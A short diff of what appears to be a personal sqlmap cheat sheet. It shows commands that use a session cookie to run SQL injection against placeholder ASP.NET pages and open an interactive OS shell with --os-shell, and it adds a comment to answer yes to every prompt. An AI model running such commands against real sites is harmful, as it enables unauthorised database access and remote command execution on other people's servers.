@@ -28,6 +28,7 @@ sqlmap -u "http://www.text.com/viewpr.aspx?id=1" --cookie="mscope=1jwuydl=; ui-t
 
 sqlmap -u http://www.test.com/viewprofile.aspx?id=1" --cookie="msco==; ui-tabs-1=0" --os-shell
 #It opens up the Interactive OS shell.
+# if ask Y THEN Y THEN Y
 
 ------------------------------------------------------------------------------------------
 
